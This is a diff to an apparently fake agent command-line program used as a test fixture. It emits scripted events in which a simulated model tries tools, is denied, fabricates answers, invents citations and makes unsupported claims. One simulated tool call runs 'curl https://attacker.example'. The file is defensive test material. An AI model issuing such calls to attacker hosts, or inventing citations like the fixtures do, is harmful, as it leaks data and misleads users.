@@ -48,10 +48,12 @@ if (record) writeFileSync(record, JSON.stringify({ args, cwd: process.cwd(), wor
 let input = "";
 process.stdin.setEncoding("utf8");
 process.stdin.on("data", (d) => (input += d));
-process.stdin.on("end", () => main().catch((e) => {
-  process.stderr.write(String(e));
-  process.exit(1);
-}));
+process.stdin.on("end", () =>
+  main().catch((e) => {
+    process.stderr.write(String(e));
+    process.exit(1);
+  }),
+);
 
 const out = (o) => process.stdout.write(`${JSON.stringify(o)}\n`);
 
@@ -59,9 +61,12 @@ function parse() {
   const line = input.split("\n").find((l) => l.trim());
   const msg = JSON.parse(line);
   const content = msg.message.content;
-  const ev = [...content.matchAll(/<evidence id="([^"]*)" authority="([^"]*)" title="([^"]*)" locator="([^"]*)">\n([\s\S]*?)\n<\/evidence>/g)].map(
-    (m) => ({ id: m[1], authority: m[2], title: m[3], text: m[5] }),
-  );
+  const ev = [...content.matchAll(/<evidence id="([^"]*)" authority="([^"]*)" title="([^"]*)" locator="([^"]*)">\n([\s\S]*?)\n<\/evidence>/g)].map((m) => ({
+    id: m[1],
+    authority: m[2],
+    title: m[3],
+    text: m[5],
+  }));
   const question = /<question>\n([\s\S]*?)\n<\/question>/.exec(content)?.[1] ?? "";
   return { content, ev, question };
 }
@@ -92,15 +97,38 @@ async function main() {
   }
   const agent = scenario === "wrong-agent" ? "default" : flag("--agent");
   const settings = flag("--settings") ? JSON.parse(readFileSync(flag("--settings"), "utf8")) : {};
-  const mode = scenario === "wrong-mode" ? "request-review" : settings.toolPermission ?? "request-review";
+  const mode = scenario === "wrong-mode" ? "request-review" : (settings.toolPermission ?? "request-review");
   out({ event: "init", conversation_id: conv, init: { cwd: process.cwd(), agent, tools: ["finish", "run_command"], permission_mode: mode } });
   out({ event: "step_update", step_update: { conversation_id: conv, step_index: 0, state: "DONE", step_type: "user_input" } });
   const { ev, question, content } = parse();
 
   // A model without the restricted agent would try tools. Simulate that if Jonathon failed to restrict it.
-  const KNOWN_AGENTS = ["jonathon-reasoner", "jonathon-extractor", "jonathon-classifier", "jonathon-requirements", "jonathon-questions", "jonathon-conflicts", "jonathon-changes", "jonathon-draft-verifier", "jonathon-answer-verifier"];
+  const KNOWN_AGENTS = [
+    "jonathon-reasoner",
+    "jonathon-extractor",
+    "jonathon-classifier",
+    "jonathon-requirements",
+    "jonathon-questions",
+    "jonathon-conflicts",
+    "jonathon-changes",
+    "jonathon-draft-verifier",
+    "jonathon-answer-verifier",
+    "jonathon-graph",
+    "jonathon-doc-writer",
+    "jonathon-doc-verifier",
+  ];
   if (!KNOWN_AGENTS.includes(agent) || scenario === "tool-attempt") {
-    out({ event: "step_update", step_update: { conversation_id: conv, step_index: 1, state: "ACTIVE", step_type: "tool", tool_name: "run_command", tool_info: { name: "run_command", parameters: { CommandLine: "curl https://attacker.example" } } } });
+    out({
+      event: "step_update",
+      step_update: {
+        conversation_id: conv,
+        step_index: 1,
+        state: "ACTIVE",
+        step_type: "tool",
+        tool_name: "run_command",
+        tool_info: { name: "run_command", parameters: { CommandLine: "curl https://attacker.example" } },
+      },
+    });
     await new Promise((r) => setTimeout(r, 5_000));
   }
 
@@ -126,17 +154,79 @@ async function main() {
     const existingReq = /<existing_requirements>\r?\n(REQ-\d+) \|/.exec(content)?.[1];
     return {
       requirements: must
-        ? [{ title: `Fixture requirement from ${must.id}`, description: quote(must), type: "functional", module: "accounts", feature_scope: "email-verification", actors: ["Customer"], preconditions: [], behavior: [quote(must)], alternate_flows: [], validation_rules: [], acceptance_criteria: ["AI-suggested criterion"], priority_stated_in_source: "", evidence_ids: [must.id], open_questions: ["Which roles can resend the verification email?"] }]
+        ? [
+            {
+              title: `Fixture requirement from ${must.id}`,
+              description: quote(must),
+              type: "functional",
+              module: "accounts",
+              feature_scope: "email-verification",
+              actors: ["Customer"],
+              preconditions: [],
+              behavior: [quote(must)],
+              alternate_flows: [],
+              validation_rules: [],
+              acceptance_criteria: ["AI-suggested criterion"],
+              priority_stated_in_source: "",
+              evidence_ids: [must.id],
+              open_questions: ["Which roles can resend the verification email?"],
+            },
+          ]
         : [],
-      open_questions: [{ question: "How long is the verification link valid?", context: "Not stated in the evidence.", blocking: true, feature_scope: "email-verification", evidence_ids: E ? [E.id] : [] }],
+      open_questions: [
+        {
+          question: "How long is the verification link valid?",
+          context: "Not stated in the evidence.",
+          blocking: true,
+          feature_scope: "email-verification",
+          evidence_ids: E ? [E.id] : [],
+        },
+      ],
       requirement_updates:
         existingReq && must
-          ? [{ requirement_id: existingReq, change_summary: `New document adds detail from ${must.id}`, proposed_description: "", added_behavior: [quote(must)], added_validation_rules: [], added_acceptance_criteria: ["AI-suggested follow-up criterion"], rationale: "The new document states this.", evidence_ids: [must.id] }]
+          ? [
+              {
+                requirement_id: existingReq,
+                change_summary: `New document adds detail from ${must.id}`,
+                proposed_description: "",
+                added_behavior: [quote(must)],
+                added_validation_rules: [],
+                added_acceptance_criteria: ["AI-suggested follow-up criterion"],
+                rationale: "The new document states this.",
+                evidence_ids: [must.id],
+              },
+            ]
           : [],
       conflicts: [
-        ...(own.length >= 2 ? [{ title: "Fixture conflict", description: "Two sources disagree.", feature_scope: "email-verification", side_a_claim: "A", side_a_evidence_ids: [own[0].id], side_b_claim: "B", side_b_evidence_ids: [own[1].id], blocking: true }] : []),
+        ...(own.length >= 2
+          ? [
+              {
+                title: "Fixture conflict",
+                description: "Two sources disagree.",
+                feature_scope: "email-verification",
+                side_a_claim: "A",
+                side_a_evidence_ids: [own[0].id],
+                side_b_claim: "B",
+                side_b_evidence_ids: [own[1].id],
+                blocking: true,
+              },
+            ]
+          : []),
         // Cross-document: the model may list the other document first; Jonathon must put this document on side 1.
-        ...(other && E ? [{ title: `Cross-document disagreement on ${quote(E).slice(0, 30)}`, description: "Another document in the project says something different.", feature_scope: "", side_a_claim: quote(other), side_a_evidence_ids: [other.id], side_b_claim: quote(E), side_b_evidence_ids: [E.id], blocking: false }] : []),
+        ...(other && E
+          ? [
+              {
+                title: `Cross-document disagreement on ${quote(E).slice(0, 30)}`,
+                description: "Another document in the project says something different.",
+                feature_scope: "",
+                side_a_claim: quote(other),
+                side_a_evidence_ids: [other.id],
+                side_b_claim: quote(E),
+                side_b_evidence_ids: [E.id],
+                blocking: false,
+              },
+            ]
+          : []),
       ],
     };
   };
@@ -148,6 +238,9 @@ async function main() {
     "jonathon-changes": "team-changes",
     "jonathon-draft-verifier": "team-verify-draft",
     "jonathon-answer-verifier": "team-verify-answer",
+    "jonathon-graph": "team-graph",
+    "jonathon-doc-writer": "team-doc-writer",
+    "jonathon-doc-verifier": "team-doc-verifier",
   };
   // Team roles answer for themselves in the normal and verifier scenarios; failure scenarios still apply to them.
   const role =
@@ -165,22 +258,55 @@ async function main() {
     case "wrong-agent":
     case "wrong-mode":
       structured = E
-        ? turn({ answer_markdown: `Per the evidence: ${quote(E)} [${E.id}]`, citations: [{ evidence_id: E.id, quote: quote(E) }], claims_implementation_ready: true })
+        ? turn({
+            answer_markdown: `Per the evidence: ${quote(E)} [${E.id}]`,
+            citations: [{ evidence_id: E.id, quote: quote(E) }],
+            claims_implementation_ready: true,
+          })
         : turn({ status: "insufficient_evidence", answer_markdown: "No evidence." });
       break;
     case "answer-unknown-citation":
-      structured = turn({ answer_markdown: "Invented rule: links expire after 24 hours.", citations: [{ evidence_id: "E99", quote: "links expire after 24 hours" }], claims_implementation_ready: true });
+      structured = turn({
+        answer_markdown: "Invented rule: links expire after 24 hours.",
+        citations: [{ evidence_id: "E99", quote: "links expire after 24 hours" }],
+        claims_implementation_ready: true,
+      });
       break;
     case "answer-misquote":
-      structured = turn({ answer_markdown: "Claim.", citations: [{ evidence_id: E.id, quote: "this sentence does not appear anywhere in the evidence" }], claims_implementation_ready: true });
+      structured = turn({
+        answer_markdown: "Claim.",
+        citations: [{ evidence_id: E.id, quote: "this sentence does not appear anywhere in the evidence" }],
+        claims_implementation_ready: true,
+      });
       break;
     case "denied":
-      out({ event: "step_update", step_update: { conversation_id: conv, step_index: 1, state: "ERROR", step_type: "tool", tool_name: "run_command", tool_info: { name: "run_command", error: { type: "TOOL_ERROR", message: "permission check failed: Matches user-configured deny rule." } } } });
+      out({
+        event: "step_update",
+        step_update: {
+          conversation_id: conv,
+          step_index: 1,
+          state: "ERROR",
+          step_type: "tool",
+          tool_name: "run_command",
+          tool_info: { name: "run_command", error: { type: "TOOL_ERROR", message: "permission check failed: Matches user-configured deny rule." } },
+        },
+      });
       structured = turn({ answer_markdown: "Fabricated after denial.", citations: [], claims_implementation_ready: true });
       break;
     case "soft-denied":
       process.stderr.write("jetski: run_command auto-denied in headless mode\n");
-      out({ event: "result", result: { conversation_id: conv, status: "SUCCESS", response: "x", structured_output: turn({ citations: [{ evidence_id: E?.id ?? "E1", quote: E ? quote(E) : "" }] }), denied_actions: [{ action: "command", display_name: "Bash" }], num_turns: 1, duration_seconds: 0.1 } });
+      out({
+        event: "result",
+        result: {
+          conversation_id: conv,
+          status: "SUCCESS",
+          response: "x",
+          structured_output: turn({ citations: [{ evidence_id: E?.id ?? "E1", quote: E ? quote(E) : "" }] }),
+          denied_actions: [{ action: "command", display_name: "Bash" }],
+          num_turns: 1,
+          duration_seconds: 0.1,
+        },
+      });
       process.exit(0);
       break;
     case "no-structured":
@@ -195,14 +321,21 @@ async function main() {
       if (!requested && !content.includes("Additional evidence")) {
         structured = turn({ action: "request_more_evidence", evidence_queries: ["verification link expiry"], answer_markdown: "" });
       } else {
-        structured = E ? turn({ citations: [{ evidence_id: ev.at(-1).id, quote: quote(ev.at(-1)) }], answer_markdown: "Answered after more evidence." }) : turn({ status: "insufficient_evidence" });
+        structured = E
+          ? turn({ citations: [{ evidence_id: ev.at(-1).id, quote: quote(ev.at(-1)) }], answer_markdown: "Answered after more evidence." })
+          : turn({ status: "insufficient_evidence" });
       }
       break;
     case "extraction":
       structured = fixtureExtraction();
       break;
     case "team-classify":
-      structured = { document_kind: /effort estimation|project plan|tracker|milestone/i.test(content) ? "plan_or_estimate" : "requirements_spec", subject_system: "fixture system", numbered_item_prefixes: [], summary: "Fixture document." };
+      structured = {
+        document_kind: /effort estimation|project plan|tracker|milestone/i.test(content) ? "plan_or_estimate" : "requirements_spec",
+        subject_system: "fixture system",
+        numbered_item_prefixes: [],
+        summary: "Fixture document.",
+      };
       break;
     case "team-requirements":
       structured = { requirements: fixtureExtraction().requirements };
@@ -224,10 +357,85 @@ async function main() {
       structured = {
         verdicts: ids.map((id) => {
           const line = new RegExp(`^${id} .*$`, "m").exec(content)?.[0] ?? "";
-          if (strict && id.startsWith("Q") && /verification link/i.test(line)) return { candidate_id: id, verdict: "unsupported", unsupported_statement_ids: [], reason: "Fixture: the evidence already answers this." };
+          if (strict && id.startsWith("Q") && /verification link/i.test(line))
+            return { candidate_id: id, verdict: "unsupported", unsupported_statement_ids: [], reason: "Fixture: the evidence already answers this." };
           const bad = strict ? stmts.filter((x) => x.id.startsWith(`${id}-`) && /AI-suggested/.test(x.text)).map((x) => x.id) : [];
-          return { candidate_id: id, verdict: bad.length ? "partly_supported" : "supported", unsupported_statement_ids: bad, reason: bad.length ? "Fixture: not stated by the evidence." : "" };
+          return {
+            candidate_id: id,
+            verdict: bad.length ? "partly_supported" : "supported",
+            unsupported_statement_ids: bad,
+            reason: bad.length ? "Fixture: not stated by the evidence." : "",
+          };
         }),
+      };
+      break;
+    }
+    case "team-graph": {
+      // Two real concepts named in the evidence, one invented concept and one invented quote (both must be rejected by Jonathon).
+      const own = ev.filter((e) => /^E/.test(e.id));
+      const wordsOf = (e) => e.text.match(/[A-Za-z]{6,}/g) ?? [];
+      const a = own[0] && wordsOf(own[0])[0];
+      const b = own[0] && (wordsOf(own[1] ?? own[0]).find((w) => w.toLowerCase() !== a.toLowerCase()) ?? null);
+      const concepts = [];
+      const relations = [];
+      if (a) concepts.push({ name: a, kind: "business_term", aliases: [], description: `Fixture concept ${a}.`, evidence_ids: [own[0].id] });
+      if (b) concepts.push({ name: b, kind: "feature", aliases: [], description: `Fixture concept ${b}.`, evidence_ids: [(own[1] ?? own[0]).id] });
+      concepts.push({ name: "Quantum Ledger", kind: "system", aliases: [], description: "Invented.", evidence_ids: own[0] ? [own[0].id] : ["E1"] });
+      if (a && b) {
+        relations.push({ from: a, relation: "uses", to: b, quote: quote(own[0]).slice(0, 40), evidence_ids: [own[0].id] });
+        relations.push({ from: a, relation: "depends_on", to: b, quote: "this sentence is not in the evidence at all", evidence_ids: [own[0].id] });
+      }
+      structured = { concepts, relations };
+      break;
+    }
+    case "team-doc-writer": {
+      const own = ev.filter((e) => /^E/.test(e.id));
+      // Like a model copying a phrase: whole words only.
+      const quote = (e) =>
+        e.text
+          .replace(/\s+/g, " ")
+          .trim()
+          .slice(0, 80)
+          .replace(/\s+\S*$/, "");
+      const keys = [...content.matchAll(/^- key "([a-z_]+)" — [^\n]*?(\[table; columns: ([^\]]*)\])?:/gm)].map((m) => ({
+        key: m[1],
+        cols: m[3] ? m[3].split(", ").length : 0,
+      }));
+      const req = /^(REQ-\d+) \[/m.exec(content)?.[1];
+      structured = {
+        sections: keys.map(({ key, cols }) => ({
+          key,
+          blocks: !own[0]
+            ? [{ kind: "gap", text: "Nothing in the material covers this.", cells: [], cites: [] }]
+            : cols
+              ? [
+                  { kind: "fact", text: "", cells: [quote(own[0]), ...Array(cols - 1).fill("stated")], cites: [own[0].id] },
+                  { kind: "proposal", text: "", cells: ["Proposed default row", ...Array(cols - 1).fill("x")], cites: [] },
+                ]
+              : [
+                  { kind: "fact", text: quote(own[0]), cells: [], cites: [own[0].id] },
+                  { kind: "fact", text: "The client wants 10000 concurrent users.", cells: [], cites: [own[0].id] },
+                  { kind: "fact", text: "Unsupported claim about the client's intent.", cells: [], cites: [own[0].id] },
+                  { kind: "fact", text: "A restatement of the cited passage.", cells: [], cites: [own[0].id] },
+                  ...(req ? [{ kind: "fact", text: `Knowledge item ${req} applies here.`, cells: [], cites: [req] }] : []),
+                  { kind: "fact", text: "A fact that cites nothing real.", cells: [], cites: ["E99"] },
+                  { kind: "proposal", text: "Proposed: use structured JSON logging.", cells: [], cites: [] },
+                  { kind: "gap", text: "Who approves production releases?", cells: [], cites: [] },
+                  { kind: "diagram", text: "flowchart LR\n  A[Client] --> B[System]", cells: [], cites: [own[0].id] },
+                  { kind: "diagram", text: "not a diagram", cells: [], cites: [] },
+                ],
+        })),
+      };
+      break;
+    }
+    case "team-doc-verifier": {
+      const items = [...content.matchAll(/^([FP]\d+) \[cites: [^\]]*\] (.*)$/gm)].map((m) => ({ id: m[1], text: m[2] }));
+      structured = {
+        verdicts: items.map((i) =>
+          /Unsupported claim/.test(i.text)
+            ? { item_id: i.id, verdict: "unsupported", reason: "Fixture: the passage does not say this." }
+            : { item_id: i.id, verdict: "supported", reason: "" },
+        ),
       };
       break;
     }
@@ -236,14 +444,31 @@ async function main() {
       break;
     case "team-verify-answer": {
       const claims = [...content.matchAll(/^(S\d+): (.*)$/gm)].map((m) => ({ id: m[1], text: m[2] }));
-      structured = { claims: claims.map((c) => (/Invented/.test(c.text) ? { claim_id: c.id, verdict: "unsupported", evidence_ids: [], reason: "Fixture: no evidence states this." } : { claim_id: c.id, verdict: "supported", evidence_ids: ["E1"], reason: "" })) };
+      structured = {
+        claims: claims.map((c) =>
+          /Invented/.test(c.text)
+            ? { claim_id: c.id, verdict: "unsupported", evidence_ids: [], reason: "Fixture: no evidence states this." }
+            : { claim_id: c.id, verdict: "supported", evidence_ids: ["E1"], reason: "" },
+        ),
+      };
       break;
     }
     default:
       structured = turn({ status: "insufficient_evidence" });
   }
   void question;
-  const result = { event: "result", result: { conversation_id: conv, status: "SUCCESS", response: JSON.stringify(structured), structured_output: structured, duration_seconds: 0.2, num_turns: 1, usage: { input_tokens: 10, output_tokens: 5, total_tokens: 15 } } };
+  const result = {
+    event: "result",
+    result: {
+      conversation_id: conv,
+      status: "SUCCESS",
+      response: JSON.stringify(structured),
+      structured_output: structured,
+      duration_seconds: 0.2,
+      num_turns: 1,
+      usage: { input_tokens: 10, output_tokens: 5, total_tokens: 15 },
+    },
+  };
   out({ event: "step_update", step_update: { conversation_id: conv, step_index: 2, state: "DONE", step_type: "finish" } });
   if (scenario === "split-chunks") {
     const s = `${JSON.stringify(result)}\n`;
